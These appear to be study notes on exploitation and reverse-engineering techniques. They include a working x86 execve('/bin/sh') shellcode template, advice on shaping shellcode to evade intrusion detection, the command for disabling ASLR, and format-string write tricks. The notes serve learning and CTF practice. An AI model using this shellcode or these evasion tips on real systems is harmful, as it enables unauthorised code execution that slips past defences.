# Common Techniques
These are many common techniques used in different reverse engineering problems.
## Binary Patching
- https://materials.rangeforce.com/tutorial/2020/04/12/Patching-Binaries/
- can be done easily in a decompiler like ida or ghidra
## Command Line Injection
  - changing system file paths
## Shellcode
  - execve(sh, argv, envp): executes the shell
    - sh: is the file
    - argv: multiple argument vector
    - envp: environment variable vector
  - vector in C is ended with NULL to tell how many items are in the vector
  -  don't `use mov eax, 0` don't want a null byte in the payload
  -  al is the lowest byte of eax
  -  envp will be the second element of argv
  -  if execve is blocked there are plenty of other system calls that can be used
  -  write concise shellcode because ids systems will block anything too long
     -  use the stack
     -  use `xor`
     -  use `cbw` and its variant
     -  staging shellcode in environment variables
     -  leverage context 
        -  what is already in registers
  - if you are only using alphanumeric chars
    - construct the real shellcode on the stack at runtime
      - this technique is known as self modifying shellcode
    - this will easily fool ids systems
    - http://phrack.org/issues/57/15.html#article
    - ex.
        ```
        movw $0, %ax   ; 0x66 0xb8 0x00, 0x00, 0x00 (not allowed)
        ->
        andw $0x454e, %ax 
        andw $0x3a31, %ax
        ```
  - it is possible to write exploits that are system blind
    - one technique is opening emulators for each architecture and brute force the byte combinations
  -  useful template for shellcode
``` 
#include <sys/syscall.h> 
#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+4)

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    esi                    /* esi points to STRING */
  mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
  xor    eax,eax                /* get a 32-bit zero value */
  mov    [STRLEN + esi],al      /* null-terminate our string */
  mov    [ENVP + esi], eax      /* set up null envp */

  mov    al,SYS_execve          /* syscall number */
  mov    ebx,esi                /* arg 1: string pathname */
  lea    ecx,[ARGV + esi]       /* arg 2: argv */
  lea    edx,[ENVP + esi]       /* arg 3: envp */
  int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */

  xor    ebx,ebx                /* arg 1: 0 */
  mov    eax,ebx
  inc    eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int    0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING 
  ```
  - can inject shellcode through stack, env variables, file names, and arguments

## Security Protections
- nx being disabled means that memory spaces such as the stack are executable

## Stack Canary
- places a random value on stack to check integrity of ra
- gs: thread local storage
  - canary chosen from here
- if using two strcpy's in a row and switching the arguments, check for overwriting the second strcpy's arguments


## DEP 
- Data Execution Prevention 
- it is NX or X^W
- does not let you execute code so cannot inject shellcode
  
## ASLR
- Address Space Layout Randomization (ASLR, PIE)
- `cat /proc/sys/kernel/randomize_va_space` - > 2
  - change it to zero ti disable
- `./check`
- randomized segments but offsets in each segment are the same


## ROP
- Can get around all the protections if can leak a specific address
- OneGadget can be very useful


## String Formatted Attacks
- how does printf know of #arguments passed?
- how do we access the arguments in the function
- adding an extra argument to printf
  - works fine 
  - having one less argument will look at one value above in the stack
- a variadic function
  - allows for a variable number of arguments
  - $ specifier moves up the argument chain
  - %n will used to write to an address
  - %10d print an int on 10-space word
  - %hhn lets you write you write a smaller amount
- libc function address are figured out at runtime using plt
- can print got (global offset table)

## Fuzzing and Symbolic Execution
- symbolic execution can be very slow
- fuzzing is preferred
  - AFL is a good tool for fuzzing 
    - made with heuristics to be very efficient
    - expecting binaries
  - Radasma: syntax-aware fuzzer
  - Cross-fuzz: function syntax for Javascrpt
  - langfuzz: fuzzing program languages
  - Driller/GYSM: fuzzing-symbolic execution
  - https://tc.gts3.org/cs6265/tut/tut10-01-fuzzing.html


